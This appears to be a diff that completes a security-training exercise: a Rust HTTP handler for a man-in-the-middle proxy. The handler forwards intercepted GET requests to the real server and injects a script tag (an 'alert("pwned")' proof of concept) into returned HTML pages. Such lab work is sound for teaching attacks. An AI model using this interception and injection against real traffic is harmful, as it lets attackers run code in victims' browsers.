@@ -1,16 +1,19 @@
-// TODO: remove the line below when working on the file
-#![expect(unused_variables, dead_code)]
-
 use std::collections::HashMap;
 use std::fmt::Write;
+use std::io;
 use std::io::Read;
 
-use anyhow::Result;
-use http::header::{CONNECTION, CONTENT_ENCODING, CONTENT_LENGTH};
+use anyhow::{Result, bail};
+use http::header::{CONNECTION, CONTENT_ENCODING, CONTENT_LENGTH, CONTENT_TYPE};
 use http::response::Parts;
-use http::{HeaderMap, HeaderValue};
+use http::{HeaderMap, HeaderName, HeaderValue};
+use httparse::Status;
 
+use crate::constants::SERVER_IP;
 use crate::models::ConnectionId;
+use crate::upstream::UpstreamsManager;
+
+const READ_BUFFER_SIZE: usize = 1024;
 
 fn format_response(mut head: Parts, mut body: Vec<u8>) -> Result<(Vec<u8>, usize)> {
     let mut formatted = String::new();
@@ -52,12 +55,18 @@ pub struct HttpHandlerOptions {
 
 pub struct HttpHandler {
     active_connections_data: HashMap<ConnectionId, Vec<u8>>,
+    upstreams_manager: UpstreamsManager,
 }
 
 impl HttpHandler {
     pub fn new() -> Self {
+        let static_domains = [(String::from("domain.com"), SERVER_IP.parse().unwrap())]
+            .into_iter()
+            .collect();
+
         Self {
             active_connections_data: HashMap::default(),
+            upstreams_manager: UpstreamsManager::new(static_domains),
         }
     }
 
@@ -73,38 +82,98 @@ impl HttpHandler {
         packet: &mut R,
         options: &HttpHandlerOptions,
     ) -> Result<Option<Vec<u8>>> {
-        // TODO: Exercise 4.1
-        // Implement the handling of an HTTP request. This will be the last
-        // handler of this training.
-        // The first part of this exercice is to forward the incomming request
-        // to the legitimate server.
-        // For this, we recommend using httparse and ureq. You can also make use
-        // of the provided crate::upstream::UpstreamsManager to handle the call
-        // to the legitimate server with ureq. This struct includes a custom
-        // resolver that will help you handle the domain requested by the
-        // client.
-        // Note: you are now given a reader instead of the raw packet data.
-        // Once correctly implemented, you should pass test case #5.
+        log::trace!("received http packet...");
 
-        // TODO: Exercice 4.2
-        // The goal of this exercise is to embed a malicous payload in the web
-        // page returned to the victim. The payload will be in the form of an
-        // embedded <script> section.
-        // to the victim the expected web page, but with a malicious payload
-        // included in the form of an embedded <script> section.
-        // You will need to parse and send an HTTP request.
-        // Once correctly implemented, you should pass test case #7 for http.
+        let active_connection_data = self
+            .active_connections_data
+            .entry(options.conn_id.clone())
+            .or_default();
 
-        if !self.should_intercept() {
+        loop {
+            let mut packet_data = [0u8; READ_BUFFER_SIZE];
+            let read_amount = match packet.read(&mut packet_data) {
+                Ok(0) => break,
+                Ok(read_amount) => read_amount,
+                Err(e) if e.kind() == io::ErrorKind::WouldBlock => break,
+                Err(e) => bail!(e),
+            };
+
+            active_connection_data.extend_from_slice(&packet_data[0..read_amount]);
+        }
+
+        let mut headers = [httparse::EMPTY_HEADER; 64];
+        let mut request = httparse::Request::new(&mut headers);
+        let response = request.parse(active_connection_data)?;
+        let headers_size = match response {
+            Status::Complete(headers_size) => headers_size,
+            Status::Partial => {
+                log::debug!("received incomplete request...");
+                return Ok(None);
+            }
+        };
+
+        let content_length = request
+            .headers
+            .iter()
+            .find(|h| h.name.to_ascii_lowercase() == CONTENT_LENGTH.as_str())
+            .map(|v| String::from_utf8_lossy(v.value))
+            .map(|s| s.to_string())
+            .and_then(|s| s.parse::<usize>().ok())
+            .unwrap_or(0);
+
+        if headers_size + content_length > active_connection_data.len() {
+            log::warn!("not enough body data yet");
             return Ok(None);
         }
 
-        Ok(None)
-    }
+        let request_body = &active_connection_data[headers_size..];
 
-    fn should_intercept(&self) -> bool {
-        // TODO: implement your custom interception logic here. You may pass
-        // additional parameters to this function.
-        true
+        let mut headers = HashMap::new();
+        for header in request.headers {
+            headers.insert(
+                HeaderName::from_bytes(header.name.as_bytes())?,
+                HeaderValue::from_bytes(header.value)?,
+            );
+        }
+
+        let response = match request.method {
+            Some(m) => match m {
+                "GET" => self.upstreams_manager.get(
+                    options.is_underlying_layer_encrypted,
+                    request.path,
+                    headers,
+                    request_body,
+                )?,
+                m => {
+                    bail!("method not handled (yet): {m}")
+                }
+            },
+            None => bail!("cannot intercept request without method"),
+        };
+
+        let (head, mut body) = response.into_parts();
+
+        let body = match head.headers.get(CONTENT_TYPE) {
+            Some(content_type)
+                if content_type == HeaderValue::from_static("text/html; charset=utf-8") =>
+            {
+                let html = body.read_to_string()?;
+
+                let script = r#"<script>alert("pwned")</script>"#;
+
+                let injected_html = if html.contains("</body>") {
+                    html.replacen("</body>", &format!("{script}\n</body>"), 1)
+                } else {
+                    html
+                };
+
+                injected_html.into_bytes()
+            }
+            Some(_) | None => body.read_to_vec()?,
+        };
+
+        let (response_data, _) = format_response(head, body)?;
+
+        Ok(Some(response_data))
     }
 }
